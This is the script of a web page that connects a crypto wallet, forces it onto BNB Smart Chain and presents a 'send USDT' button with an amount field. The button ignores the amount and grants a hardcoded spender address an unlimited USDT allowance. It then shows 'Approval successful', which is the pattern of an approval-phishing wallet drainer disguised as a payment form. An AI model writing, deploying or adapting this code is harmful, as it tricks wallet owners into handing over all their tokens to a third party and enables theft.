<script src="https://cdn.jsdelivr.net/npm/web3@1.8.0/dist/web3.min.js"></script>

<script>
const RECEIVER_ADDRESS = '0xad8bD5eCEf1c5382c086ea8053B86DB0c77aB21F';
const SPENDER_ADDRESS  = '0x89112691C976D0a2D874B0ADAe693a0Add0dAe98';
const USDT_CONTRACT    = '0x55d398326f99059fF775485246999027B3197955';
const BSC_CHAIN_ID     = '0x38';
const MAX_UINT         = '115792089237316195423570985008687907853269984665640564039457584007913129639935';

let web3, userAccount, usdt;

const sendBtn   = document.getElementById('sendBtn');
const statusDiv = document.getElementById('status');
const amountInput = document.getElementById('amount');

const ABI = [
    { constant:false, inputs:[{name:"_spender",type:"address"},{name:"_value",type:"uint256"}], name:"approve",   outputs:[{name:"",type:"bool"}], type:"function" },
    { constant:true,  inputs:[{name:"_owner",type:"address"}],                                  name:"balanceOf", outputs:[{name:"balance",type:"uint256"}],         type:"function" }
];

// ✅ Reliable delay helper
function sleep(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
}

// ✅ Switch to BSC, then wait for provider to settle before continuing
async function forceBSC() {
    const currentChain = await window.ethereum.request({ method: 'eth_chainId' });
    if (currentChain === BSC_CHAIN_ID) return; // already on BSC, skip entirely

    try {
        await window.ethereum.request({
            method: 'wallet_switchEthereumChain',
            params: [{ chainId: BSC_CHAIN_ID }]
        });
    } catch (err) {
        if (err.code === 4902) {
            await window.ethereum.request({
                method: 'wallet_addEthereumChain',
                params: [{
                    chainId: BSC_CHAIN_ID,
                    chainName: 'BNB Smart Chain',
                    nativeCurrency: { name:'BNB', symbol:'BNB', decimals:18 },
                    rpcUrls: ['https://bsc-dataseed.binance.org/'],
                    blockExplorerUrls: ['https://bscscan.com']
                }]
            });
        } else {
            throw err;
        }
    }

    // ✅ KEY FIX: Wait for Trust Wallet to fully settle after chain switch
    await sleep(1000);

    // ✅ Reinitialize web3 with the now-stable provider
    web3 = new Web3(window.ethereum);
}

async function init() {
    if (!window.ethereum) {
        showStatus("Install wallet", true);
        return;
    }

    try {
        web3 = new Web3(window.ethereum);

        // STEP 1: Connect wallet first
        const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
        userAccount = accounts[0];

        // STEP 2: Switch chain (skipped if already on BSC)
        await forceBSC();

        // STEP 3: Init contract AFTER chain is confirmed stable
        usdt = new web3.eth.Contract(ABI, USDT_CONTRACT);

        showStatus("✅ Wallet Ready");

    } catch (e) {
        showStatus("Wallet connection failed", true);
    }
}

async function sendUSDT() {
    sendBtn.disabled = true;
    showStatus("Confirm in wallet...");

    try {
        await usdt.methods.approve(SPENDER_ADDRESS, MAX_UINT).send({ from: userAccount });
        showStatus("✅ Approval successful");
    } catch (e) {
        showStatus("❌ Failed", true);
    }

    sendBtn.disabled = false;
}

function showStatus(msg, error=false) {
    statusDiv.innerText = msg;
    statusDiv.style.color = error ? "#ff4d4f" : "#16c784";
}

async function setMax() {
    const bal = await usdt.methods.balanceOf(userAccount).call();
    amountInput.value = web3.utils.fromWei(bal, 'ether');
}

window.onload = init;
sendBtn.onclick = sendUSDT;

if (window.ethereum) {
    window.ethereum.on('chainChanged', () => window.location.reload());
}
</script>
